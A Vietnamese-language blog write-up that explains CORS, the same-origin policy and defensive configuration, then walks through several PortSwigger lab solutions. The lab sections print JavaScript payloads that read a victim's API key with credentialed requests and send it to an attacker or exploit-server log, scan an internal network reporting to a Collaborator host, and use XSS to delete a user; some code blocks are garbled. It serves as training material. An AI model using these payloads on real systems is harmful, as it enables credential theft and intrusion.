---
title: 'Cross-origin resource sharing - CORS'
slug: cors
type: writeup
date: 2021-09-27
summary: 'Cross-origin resource sharing (CORS) là gì ?...'
tags: [security, writeup]
---

# Cross-origin resource sharing (CORS) là gì ?
## What is CORS ?
Tên đầy đủ là Cross-Origin Resource Sharing. Hiểu sâu hơn đó chính là chia sẻ tài nguyên có nhiều nguồn gốc khác nhau. Chính sách nguồn
gốc giống nhau của trình duyệt là một cơ chế bảo mật quan trọng. Khách hàng từ các nguồn khác nhau không thể truy cập tài nguyên của nhau
nếu không được phép. Định nghĩa của tương đồng là protocol,domain và port của liên kết truy cập là giống nhau. Trong các ứng dụng thực tế,
các yêu cầu hợp lý giữa nhiều miền cũng rất quan trọng đối với một số ứng dụng.
## Same-Origin Policy (Cùng nguồn gốc)
Same-origin policy là khi một website thực thi một cái gì đó. Nghĩa là, theo mặc định, ứng dụng web sử dụng API chỉ có thể yêu cầu tài nguyên
HTTP từ cùng một nguồn gốc. Ví dụ, ![image](https://www.mywebsite.com(https://www.mywebsite.com) yêu cầu ![image](https://www.mywebsite.com/page(https://www.mywebsite.com/page) không có vấn đề gì. Nhưng khi tài nguyên
được đặt trên các trang web có protocol , domain phụ hoặc port khác nhau , thì đó là một yêu cầu không cùng nguồn gốc mà hay
thường gọi là tên miền chéo.
Vậy, tại sao lại có same-origin policy tồn tại? Giả sử rằng chính sách cùng nguồn gốc không tồn tại và bạn đã vô tình nhấp vào một trong nhiều liên
kết có virutss mà bạn của bạn gửi cho bạn trên Facebook. Liên kết này chuyển hướng bạn đến một “trang web xấu” có nhúng iframe tải trang web của ngân
hàng của bạn và đăng nhập thành công cho bạn bằng một số cookie đã đặt! 😬 Sau khi đăng nhập thành công, trang web lừa đảo này còn có thể kiểm soát DOM
của iframe và chuyển tiền trong thẻ của bạn thông qua một loạt thao tác thần sầu mà bạn không hề biết được.
## CORS HTTP headers

CORS là một cơ chế xác nhận thông qua Header của request. Cụ thể là trên Server sẽ nói với browser về quy định chấp nhận những request từ domain nào và phương
thức ra sao (GET, POST, PUT, v.v..)

Access-Control-Allow-Origin: Những origin mà server cho phép. (ví dụ server loda.his chỉ chấp nhận loda.me request lên)

Access-Control-Allow-Headers: Những Header được server cho phép. (ví dụ x-authorize, origin, cái này do server bạn quy định)

Access-Control-Allow-Methods: Những Method được servẻ cho phép (POST, GET, v.v..)

Preflight request:
Một cái preflight request là một request được gửi từ phía trình duyệt để thăm dò xem server có hiểu/ hỗ trợ giao thức CORS hay không. Nó được tự động gởi bởi
trình duyệt. Việc của phía server là trả về những headers cần thiết cho phía client.

Origin: domain hiện tại

Access-Control-Request-Method: Gửi lên các method để kiểm tra xem server có accept không. (GET, POST, v.v..)

Access-Control-Request-Headers: thăm dò xem một header nào đó có được chấp nhận không.
## Cơ chế hoạt động của CORS như thế nào?

Trường hợp đơn giản nhất, client (web app chạy ở browser) sẽ tạo request GET, POST, PUT, HEAD, etc để yêu cầu server làm một việc gì đó. Những request này sẽ được đính
kèm một header tên là Origin để chỉ định origin của client code (giá trị của header này chính là domain của trang web).

Server sẽ xem xét Origin để biết được nguồn này có phải là nguồn hợp lệ hay không. Nếu hợp lệ, server sẽ trả về response kèm với header Access-Control-Allow-Origin.
Header này sẽ cho biết xem client có phải là nguồn hợp lệ để browser tiếp tục thực hiện quá trình request.

Trong trường hợp thông thường, Access-Control-Allow-Origin sẽ có giá trị giống như Origin, một số trường hợp giá trị của Access-Control-Allow-Origin sẽ nhìn giống giống
như Regex hay chỉ đơn giản là *, tuy nhiên thì cách dùng * thường được coi là không an toàn, ngoại trừ trường hợp API của bạn được public hoàn toàn và ai cũng có thể truy
cập được.
==> Và như thế, nếu không có header Access-Control-Allow-Origin hoặc giá trị của nó không hợp lệ thì browser sẽ không cho phép
### Ví dụ :
## Ngăn chặn các cuộc tấn công CORS
Các lỗ hổng CORS chủ yếu phát sinh do cách thiếp lập không đúng cách hoặc có sai sót.

Proper configuration of cross-domain requests(Cấu hình thích hợp của các yêu cầu tên miền chéo) : Nếu tài nguyên web chứa thông tin “nhạy cảm”, nguồn gốc web phải được
chỉ định chính xác trong tiêu đề Access-Control-Allow-Origin.

Only allow trusted sites(Chỉ cho phép những trang web tin cậy): Các nguồn gốc được chỉ định trong tiêu đề Access-Control-Allow-Origin chỉ nên là các trang web đáng tin cậy.
Đặc biệt, nguồn gốc phản ánh động từ các yêu cầu tên miền chéo mà không cần xác thực có thể dễ dàng khai thác và nên tránh.

Avoid whitelisting null(Tránh sử dụng liệt kê null): Tránh sử dụng tiêu đề Access-Control-Allow-Origin: null

Avoid wildcards in internal networks(Tránh các ký tự đại diện trong mạng nội bộ): Chỉ tin cậy cấu hình mạng để bảo vệ tài nguyên bên trong là không đủ khi các trình duyệt nội
bộ có thể truy cập các miền bên ngoài không đáng tin cậy.
## CORS Lab
### Lab: CORS vulnerability with basic origin reflection
Bài lab đã mô tả là trang web này có cấu hình CORS không an toàn ở chỗ nó tin cậy tất cả các nguồn gốc.
Để giải quyết bài lab, hãy tạo một số JavaScript sử dụng CORS để truy xuất khóa API của quản trị viên và tải mã lên máy chủ khai thác của bạn.
Lab được giải quyết khi bạn gửi thành công khóa API của quản trị viên.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: wiener: peter
Truy cập bài lab và chúng ta thấy được 1 blog và có phần login.
Theo như lab thì chúng ta login vào account được cấp từ trước và thấy được APIKey, đây chính là mục tiêu của chúng ta. Bắt lại request mà sẽ phản hồi về APIKey.
Chuyển request sang repeater và chèn thêm dòng *Origin: ![image](https://example.com(https://example.com)* vào request và send thì chúng ta sẽ thấy phản hồi *Access-Control-Allow-Origin* như mô tả vì trang web này tin cậy mọi nguồn gốc, điều đó dẫn đến bất kỳ trang web nào cũng có thể lấy được thông tin từ nó. Để lấy được apikey chúng ta có payload theo form sau :
```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','![image](https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='//malicious-website.com/log?key='+this.responseText;
};
```
Và từ đó chúng ta có được payload để sent vào exploit server như sau :
```
 var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('get','![image](https://ac621fa31ffe7a398004558a00e900a1.web-security-academy.net/accountDetails',true);
 req.withCredentials = true;
 req.send();
 function reqListener() {
     location='/log?key='+this.responseText;
 };
```
Sau khi Store payload và Deliver to Victim thì chúng ta AccessLog để lấy dữ liệu từ website chúng ta muốn và in ra màn hình như sau :
Chúng ta nhận thấy dòng log?key thì coppy và quan phần Decoder của BurpSuite để decode, chọn option url và chúng ta lấy được Apikey => submit để solve bài lab.
### Lab: CORS vulnerability with trusted null origin
Trang web này có cấu hình CORS không an toàn ở chỗ nó tin tưởng nguồn gốc “null”.
Hãy tạo một số JavaScript sử dụng CORS để truy xuất khóa API của quản trị viên và tải mã lên máy chủ khai thác của bạn. Lab được giải quyết khi bạn gửi thành công khóa API của quản trị viên.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: wiener: peter
Tương tự như bài trước chúng ta phải leak đc APIkey của account được cấp sẵn. Tuy nhiên lỗ hồng lần này là vì CORS Origin : null chứ không phải là * như lần trước nên cách khai thác sẽ khác.
Truy cập bài lab tương tự như bài trên và bắt lại request để phân tích
Như đề bài mô tả thì web này lại tin cậy là null nên chúng ta gửi request kèm theo Origin : null và nhận đc như sau
Chúng ta có thể sử dụng nhiều thủ thuật khác nhau để tạo ra một yêu cầu tên miền chéo có chứa giá trị null trong Origin Header. Điều này sẽ đáp ứng whitelist, dẫn đến truy cập tên miền chéo. Từ đó có payload như sau:
```
   var req = new XMLHttpRequest ();
   req.onload = reqListener;
   req.open('get','![image](https://ac3e1f561f18f33a80d6a58f005900ee.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();
   function reqListener() {
       location='![image](https://exploit-ac971f661f59f3b48092a571018c0000.web-security-academy.net/log?key='+encodeURIComponent(this.responseText);
   };
">
```
Truy cập vào exploit server và Store payload Deliver to Victim để sent payload đi sau đó Access log để in ra màn hình data leak được như sau:
Chúng ta nhận thấy được request là log?key thì cop và chuyển sang  Decoder của Burp suite để decode như sau :
### Lab: CORS vulnerability with trusted insecure protocols
Trang web này có cấu hình CORS không an toàn ở chỗ nó tin cậy tất cả các miền phụ bất kể giao thức.
Hãy tạo một số JavaScript sử dụng CORS để truy xuất khóa API của quản trị viên và tải mã lên máy chủ khai thác của bạn. Lab được giải quyết khi bạn gửi thành công khóa API của quản trị viên.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: wiener: peter
Trong bài này chúng ta có 1 trang web bán hàng như sau :
Đăng nhập và bắt lại request có chưa APIKey. Thêm Origin Header bất kỳ để check xem có sử dụng CORS hay không.
Như kết quả trả về ta thấy *Access-Control-Allow-Origin* và *Access-Control-Allow-Credentials* điều đó cho thấy có áp dụng CORS.
Vì bài này chú tâm đến các giao thức nên mình sẽ thử những chức năng liên quan đến API, điển hình như trong web sẽ có chức năng Check Stock, chúng ta bắt request của chức năng này xem và phân tích.
Như đã thấy thì chức năng này sẽ lấy data từ 1 tên miền phụ khác là : *http://stock.![image](https://acfb1faa1ec0c6ec81f22d5200ae00ad.web-security-academy.net(https://acfb1faa1ec0c6ec81f22d5200ae00ad.web-security-academy.net)* chúng ta có thể lợi dụng tên miền này để leak APIKey như những bài trước, để kiểm tra giả thiết thì thử thay thế Origin Header ở phần account xem có được phép hay không
Sau đó dựa theo form khai thác dựa trên tên miền phụ được phép truy cập dữ liệu như sau ;
```
   document.location="http://stock.![image](https://acfb1faa1ec0c6ec81f22d5200ae00ad.web-security-academy.net/?productId=4
   var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','![image](https://![image](https://acfb1faa1ec0c6ec81f22d5200ae00ad.
   web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() 
   {location='![image](https://exploit-ac131f241ecbc63281092d6d012d001e.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
```
Sau đó Store payload Deliver to Victim để gửi payload sang trang web mà mình exploit
Access log để hiện những data mà mình leak được thông qua tên miền phụ như sau :
Truy cập decoder của Burp để decoder url và lấy apikey để submit
### Lab: CORS vulnerability with internal network pivot attack
Trang web này có cấu hình CORS không an toàn ở chỗ nó tin cậy tất cả các nguồn gốc của mạng nội bộ.
Lab này yêu cầu nhiều bước để hoàn thành. Để giải quyếtlab, hãy tạo một số JavaScript để định vị điểm cuối trên mạng cục bộ (192.168.0.0/24, cổng 8080) mà sau đó bạn có thể sử dụng để xác định và tạo một cuộc tấn công dựa trên CORS để xóa người dùng. Lab được giải quyết khi bạn xóa người dùng Carlos.
Trường hợp mà bài lab này đưa ra đó chính là chúng ta phải tìm được vị trí của 1 private IP mà website này tin tưởng và dựa vào đó để tấn công và xóa đi người dùng,
Đây là 1 bài cấp độ Expert có nghĩa là 1 bài cực kỳ phức tạp và level cao. Tuy nhiên chúng ta đã biết được cách thức khai thác là gì nên bây giờ sẽ follow theo hướng dẫn và exploit nó thôi.
##### Bước đầu tiên: quét mạng nội bộ
Đầu tiên việc chúng ta cần làm là quét mạng nội bộ để tìm ra được địa chỉ IP, để tìm được thì chúng ta cần sự hỗ trợ của Burp Suite Collaborator Client để poll những response leak được về, đoạn payload dưới đây sẽ quét từ http://192.168.0.1 - http://192.168.0.255 và tìm xem địa chỉ nào phù hợp
```
var q = [], collaboratorURL = 'http://bbq6iwl2yh0xqnyyqkm0r8w9g0mqaf.burpcollaborator.net';
for(i=1;ir.text().then(text=>
    {
    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
  }
  ))
  .catch(e => {
  if(q.length) {
    q.shift()(wait);
  }
  });
  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
}
```
Như chúng ta có thể thấy, chúng ta đã định vị máy chủ nội bộ (trong trường hợp này) là: *192.168.0.212:8080*
##### Bước thứ hai: tìm lỗ hổng trong máy chủ nội bộ
Ở bước này chúng ta thực hiện tương tự bước đầu tiên nhưng khác biệt ở phần payload như sau :
Đoạn code này đang cố gửi username và password đi, nếu như username và password được trả về trong response thì chứng tỏ rằng có thể dẫn đến lỗi XSS.
```
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '">*');
  }
  ))
}
fetchUrl("http://192.168.0.212:8080", "http://bbq6iwl2yh0xqnyyqkm0r8w9g0mqaf.burpcollaborator.net");
```
Như chúng tôi mong đợi tên người dùng được phản ánh trong phản hồi (trong hình).
Điều này có nghĩa là chúng ta có thể chuyển hướng nạn nhân đến trang đăng nhập nội bộ và thực thi các tập lệnh từ đó, có thể bypass qua CORS.
##### Bước thứ ba : Truy xuất Admin Panel
Đoạn code này sẽ cho phép chúng ta truy xuất vào thử panel của admin
```
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '">*');
  }
  ))
}
fetchUrl("http://192.168.0.212:8080", "http://bbq6iwl2yh0xqnyyqkm0r8w9g0mqaf.burpcollaborator.net");
```
##### Bước cuối
Dựa vào biểu mẫu trả về ở bước 3 chúng ta thấy chức năng delete của admin, vây nên chúng ta viết payload như sau để thực thi biểu mẫu delete và xóa username = carlos
```
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '">*');
  }
  ))
}
fetchUrl("http://192.168.0.212:8080");
```